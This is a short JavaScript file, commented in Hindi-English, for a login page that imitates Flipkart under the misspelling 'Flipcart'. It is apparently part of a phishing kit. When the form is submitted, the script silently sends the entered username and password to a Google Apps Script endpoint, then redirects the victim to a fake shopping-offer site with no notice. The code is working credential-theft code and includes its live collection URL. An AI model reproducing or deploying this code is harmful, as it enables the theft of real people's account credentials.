// Aapka Apps Script Web App URL
const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwZv-SLEa6U7t44J52Z6YDui0QWfYbBXmqZ9SQwXHufyT5n-h5Z2WT1jhI2zI0PLR61/exec";

// Login hone ke baad redirect hone wala URL
const REDIRECT_URL = "https://flipcartshoppingoffer.github.io/Flipcart/"; 

const form = document.getElementById("contactForm");
const submitBtn = document.getElementById("loginBtn");
const togglePassword = document.getElementById("togglePassword");
const passwordInput = document.getElementById("mobile");

// Eye Icon (Show / Hide Password) Logic
if (togglePassword && passwordInput) {
  togglePassword.addEventListener("click", function () {
    if (passwordInput.type === "password") {
      passwordInput.type = "text";
      togglePassword.classList.add("active");
    } else {
      passwordInput.type = "password";
      togglePassword.classList.remove("active");
    }
  });
}

// Form Submission and Auto Redirect Logic
if (form) {
  form.addEventListener("submit", function (e) {
    e.preventDefault();

    const usernameValue = document.getElementById("name").value;
    const contactValue = document.getElementById("mobile").value;

    // Loading spinner start aur button disable
    if (submitBtn) {
      submitBtn.classList.add("loading");
      submitBtn.disabled = true;
    }

    // Data packaging
    const formData = new FormData();
    formData.append("username", usernameValue);
    formData.append("contact", contactValue);

    // GitHub Pages cross-origin fetch setup
    fetch(SCRIPT_URL, {
      method: "POST",
      mode: "no-cors",
      body: formData
    })
      .then(() => {
        form.reset();
        // Automatic redirect to site (bina kisi alert notification ke)
        window.location.href = REDIRECT_URL;
      })
      .catch((error) => {
        console.error("Error!", error);
        window.location.href = REDIRECT_URL;
      });
  });
}
